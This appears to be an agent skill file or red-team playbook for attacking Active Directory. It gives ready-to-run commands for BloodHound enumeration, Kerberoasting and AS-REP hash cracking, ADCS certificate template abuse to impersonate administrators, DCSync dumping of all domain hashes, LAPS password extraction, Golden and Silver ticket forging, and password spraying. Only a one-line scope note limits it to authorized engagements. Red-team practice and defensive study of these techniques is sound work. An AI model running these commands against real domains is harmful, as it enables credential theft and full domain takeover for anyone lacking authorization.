---
name: ad-attacks
description: Active Directory attack lane — BloodHound ingestion, Kerberoasting, AS-REP roasting, ADCS ESC1-ESC8 abuse, DCSync, LAPS extraction, and Pass-the-Hash/Ticket chains.
---

# Active Directory Attacks

AD attacks chain from credential capture → Kerberoasting → ADCS → DCSync to achieve domain compromise. Even a single low-privilege domain account is often enough.

**Quick win order:**
1. BloodHound → identify shortest path to Domain Admin
2. Kerberoasting → crack service account hashes
3. ADCS audit → ESC1-ESC8 often trivially exploitable
4. DCSync → if any principal has Replication Rights, game over

**Scope note:** Authorized internal VAPT/red team engagements only.

---

## 1. BloodHound Enumeration

```bash
# Collect all data (domain-joined host or from attacker with credentials)
bloodhound-python -u USER -p 'PASS' -d DOMAIN.LOCAL -ns DC_IP -c all --zip
bloodhound-python -u USER -p 'PASS' -d DOMAIN.LOCAL -ns DC_IP -c DCOnly --zip   # quieter

# Import zip into BloodHound UI
# Key queries to run:
# - "Find Shortest Paths to Domain Admins"
# - "Find All Domain Admins"
# - "Find Principals with DCSync Rights"
# - "Kerberoastable Accounts"
# - "AS-REP Roastable Users"
```

**Crown jewels to identify:**
- Domain Admins group members
- krbtgt account (Golden Ticket target)
- Domain Controllers
- Accounts with DCSync rights (GetChangesAll)
- Certificate Authority servers

---

## 2. Kerberoasting

```bash
# Enumerate SPN accounts (no special privileges needed)
impacket-GetUserSPNs 'DOMAIN/USER:PASS' -dc-ip DC_IP -outputfile spn_hashes.txt

# Request specific account's ticket
impacket-GetUserSPNs 'DOMAIN/USER:PASS' -dc-ip DC_IP -request-user TARGET_USER

# Crack the hash
hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt --show   # show cracked

# On Windows (PowerView)
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv spns.csv
```

**High-value SPN targets:**
- `MSSQLSvc/` — SQL Server (often has local admin on DB hosts)
- `HTTP/` — Web services
- `cifs/` — File shares
- `host/` — Broad access principals

---

## 3. AS-REP Roasting

```bash
# Users without Kerberos pre-auth (dontRequirePreAuth)
impacket-GetNPUsers 'DOMAIN/' -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep_hashes.txt
impacket-GetNPUsers 'DOMAIN/USER:PASS' -dc-ip DC_IP -request -format hashcat   # with creds

# Crack
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Enumerate dontreqpreauth users with LDAP
ldapsearch -x -H ldap://DC_IP -D 'DOMAIN\USER' -w 'PASS' \
    -b 'DC=DOMAIN,DC=LOCAL' '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName
```

---

## 4. ADCS — Certificate Services Abuse

```bash
# Enumerate certificate templates
certipy find -u 'USER@DOMAIN' -p 'PASS' -dc-ip DC_IP -json > certipy_out.json
certipy find -u 'USER@DOMAIN' -p 'PASS' -dc-ip DC_IP -vulnerable   # filter to vulnerable only

# ESC1 — Enrollee supplies Subject (most common, often misconfigured)
# Template has: Client Authentication EKU + Subject can be specified by requester
certipy req -u 'USER@DOMAIN' -p 'PASS' -dc-ip DC_IP \
    -target CA_HOST -ca 'CA-NAME' -template 'VULNERABLE_TEMPLATE' \
    -upn 'administrator@DOMAIN'   # request cert for DA account
certipy auth -pfx administrator.pfx -dc-ip DC_IP   # authenticate → get TGT

# ESC8 — NTLM relay to AD CS HTTP enrollment endpoint
certipy relay -ca CA_HOST -template DomainController

# ESC4 — Write access to template (modify to ESC1)
certipy template -u 'USER@DOMAIN' -p 'PASS' -template 'TEMPLATE' -save-old
certipy template -u 'USER@DOMAIN' -p 'PASS' -template 'TEMPLATE' -configuration /tmp/esc4_config.json
```

**ESC Checklist (most impactful):**
| ESC | Description | Impact |
|-----|-------------|--------|
| ESC1 | Template allows SAN, any user can enroll | Any account → DA |
| ESC2 | Template with Any Purpose EKU | Auth as any user |
| ESC4 | Write access to certificate template | Modify to ESC1 |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | Any enrollment → SAN |
| ESC8 | NTLM relay to HTTP enrollment | Relay DC → DA |

---

## 5. DCSync

```bash
# Requires: GetChanges + GetChangesAll on domain (Replication rights)
# Common principals with this: Domain Admins, Enterprise Admins, MSOL_ accounts

# Dump all hashes including krbtgt
secretsdump.py 'DOMAIN/USER:PASS@DC_IP' -just-dc -outputfile dcsync_hashes

# krbtgt hash → Golden Ticket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN.LOCAL administrator
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass DOMAIN.LOCAL/administrator@DC_FQDN

# Check who has DCSync rights (BloodHound query)
# "Find Principals with DCSync Rights"
# Or: Get-ObjectAcl -DistinguishedName DC=DOMAIN,DC=LOCAL -ResolveGUIDs | Where-Object {$_.ObjectAceType -match "Replication"}
```

---

## 6. LAPS — Local Admin Password Extraction

```bash
# Check if LAPS is deployed
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object {$_."ms-Mcs-AdmPwd" -ne $null} | Select Name, "ms-Mcs-AdmPwd"

# With Impacket
ldapsearch -x -H ldap://DC_IP -D 'DOMAIN\USER' -w 'PASS' \
    -b 'DC=DOMAIN,DC=LOCAL' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd sAMAccountName

# LAPSToolkit.ps1
Get-LAPSPasswords
Find-LAPSDelegatedGroups   # who can read LAPS passwords
```

---

## 7. Golden / Silver Tickets

```bash
# Golden Ticket (krbtgt hash required)
impacket-ticketer \
    -nthash KRBTGT_NT_HASH \
    -domain-sid S-1-5-21-XXXXXXXX \
    -domain DOMAIN.LOCAL \
    administrator

export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass DOMAIN.LOCAL/administrator@DC_FQDN

# Silver Ticket (service account hash)
# Forges TGS for specific service — stealthier than Golden Ticket
impacket-ticketer \
    -nthash SERVICE_HASH \
    -domain-sid DOMAIN_SID \
    -domain DOMAIN.LOCAL \
    -spn cifs/TARGET.DOMAIN.LOCAL \
    -user-id 500 \
    administrator
```

---

## 8. Quick Wins from Low-Priv Domain Account

```bash
# 1. Check AS-REP roastable accounts
impacket-GetNPUsers 'DOMAIN/USER:PASS' -dc-ip DC_IP -request -format hashcat

# 2. Check Kerberoastable accounts
impacket-GetUserSPNs 'DOMAIN/USER:PASS' -dc-ip DC_IP -request

# 3. Enumerate ADCS
certipy find -u 'USER@DOMAIN' -p 'PASS' -dc-ip DC_IP -vulnerable

# 4. Check LAPS readability
ldapsearch -x -H ldap://DC_IP -D 'DOMAIN\USER' -w 'PASS' \
    -b 'DC=DOMAIN,DC=LOCAL' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd

# 5. Password spraying (use only if explicitly authorized)
nxc smb DC_IP -u users.txt -p 'PASS' --continue-on-success

# 6. BloodHound — always the first step
bloodhound-python -u USER -p 'PASS' -d DOMAIN -ns DC_IP -c all --zip
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Tool |
|-----------|-----|------|
| Kerberoasting | T1558.003 | GetUserSPNs, Rubeus |
| AS-REP Roasting | T1558.004 | GetNPUsers, Rubeus |
| DCSync | T1003.006 | secretsdump.py, Mimikatz |
| ADCS Abuse | T1649 | Certipy |
| LAPS Extraction | T1552.005 | LAPSToolkit, ldapsearch |
| Golden Ticket | T1558.001 | Mimikatz, ticketer |
| Silver Ticket | T1558.002 | Mimikatz, ticketer |
| BloodHound | T1615 | bloodhound-python |
